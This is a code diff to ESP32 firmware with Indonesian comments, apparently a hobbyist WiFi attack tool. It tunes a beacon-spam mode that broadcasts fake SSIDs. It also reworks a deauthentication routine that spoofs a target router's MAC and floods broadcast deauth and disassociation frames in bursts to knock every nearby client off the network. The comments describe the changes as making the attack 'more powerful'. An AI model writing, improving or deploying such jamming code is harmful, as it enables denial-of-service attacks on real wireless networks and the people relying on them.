@@ -57,8 +57,10 @@ void loopWiFi(void * pvParameters) {
          
     
         int randomIdx = esp_random() % 8; 
-        String currentSSID = fakeSSIDs[randomIdx]; // Ambil dari list acak
+        String currentSSID = fakeSSIDs[randomIdx];
         sendBeacon(currentSSID);
+        // PENTING: Kasih jeda setelah keliling 13 channel biar Core 0 gak panic
+        vTaskDelay(10 / portTICK_PERIOD_MS); 
       } 
       else if (aktifModeSpam == 2) {
          // --- PELURU RICKROLL ---
@@ -74,7 +76,7 @@ void loopWiFi(void * pvParameters) {
          // (Khusus BLE nanti pake library NimBLE atau BLEDevice)
       }
       
-      esp_wifi_set_promiscuous(false);
+      
       vTaskDelay(50 / portTICK_PERIOD_MS); // Biar gak crash
     } else if (triggerScan) {
       sedang_scan = true;
@@ -105,59 +107,38 @@ void loopWiFi(void * pvParameters) {
       scanDone = true;     // Lapor ke Core 1 kalau udah beres
       triggerScan = false; // Matiin pelatuknya
     } else if (isDeauthing && adaTarget) {
+    // 1. PINDAH MODE KE AP (Biar lebih sakti kayak GhostESP)
+    esp_wifi_set_mode(WIFI_MODE_AP); 
     esp_wifi_set_promiscuous(true);
-    WiFi.mode(WIFI_STA); // Paksa mode Station tapi jangan konek mana-mana
-    esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
-
     
-        uint8_t targetMac[6];
-    stringToMac(targetTerkunci.mac, targetMac); // Ini MAC Router
-    Serial.println(targetTerkunci.mac);
-    
-    // PELURU MAUT: Tembak ke semua HP yang ada di jangkauan router itu
+    uint8_t targetMac[6]; // MAC Router
+    stringToMac(targetTerkunci.mac, targetMac);
     uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-    // ==========================================
-    // 1. SETTING PAKET DEAUTH (0xc0)
-    // ==========================================
-    memcpy(&deauthFrame[4],  broadcastMac, 6); // TUJUAN: Semua HP
-    memcpy(&deauthFrame[10], targetMac,    6); // PENGIRIM: Nyamar jadi Router
-    memcpy(&deauthFrame[16], targetMac,    6); // BSSID: ID Jaringannya
+    // Setting Peluru (Nyamar jadi Router)
+    memcpy(&deauthFrame[4],  broadcastMac, 6); 
+    memcpy(&deauthFrame[10], targetMac,    6); 
+    memcpy(&deauthFrame[16], targetMac,    6);
 
-    // ==========================================
-    // 2. SETTING PAKET DISASSOCIATION (0xa0)
-    // ==========================================
-    memcpy(&disasFrame[4],  broadcastMac, 6);  // TUJUAN: Semua HP
-    memcpy(&disasFrame[10], targetMac,    6);  // PENGIRIM: Nyamar jadi Router
-    memcpy(&disasFrame[16], targetMac,    6);  // BSSID: ID Jaringannya
-
-    // Kunci Channel Target
     esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
 
-    // BURST MODE: Tembak bertubi-tubi
-    for(int i=0; i<50; i++) {
-        // Acak Sequence Number biar kayak paket asli
-        uint16_t seq = (uint16_t)(esp_random() & 0xFFFF);
+    // 2. TEMBAK BURST (Tanpa Delay Mikro yang kelamaan)
+    for(int i=0; i<25; i++) {
+        uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
         deauthFrame[22] = seq & 0xFF;
         deauthFrame[23] = (seq >> 8) & 0xFF;
-        disasFrame[22]  = seq & 0xFF;
-        disasFrame[23]  = (seq >> 8) & 0xFF;
         
-        // Tembak Deauth
-        esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
-        delay(1); // Kasih 1ms biar antena gak stres
-        esp_wifi_80211_tx(WIFI_IF_STA, disasFrame, sizeof(disasFrame), false);
-        delay(1);
+        // GUNAKAN WIFI_IF_AP !!!
+        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
+        esp_wifi_80211_tx(WIFI_IF_AP, disasFrame, sizeof(disasFrame), false);
+        
+        if(i % 10 == 0) vTaskDelay(1); // Kasih napas dikit tiap 10 tembakan
     }
 
-    esp_wifi_set_promiscuous(false);
+    
     vTaskDelay(50 / portTICK_PERIOD_MS); 
 }
 
-    
-     // Core 0 istirahat 50ms biar gak overheat sambil nunggu perintah
-    vTaskDelay(50 / portTICK_PERIOD_MS); 
-  }
 }
 
 void sendBeacon(String ssid) {
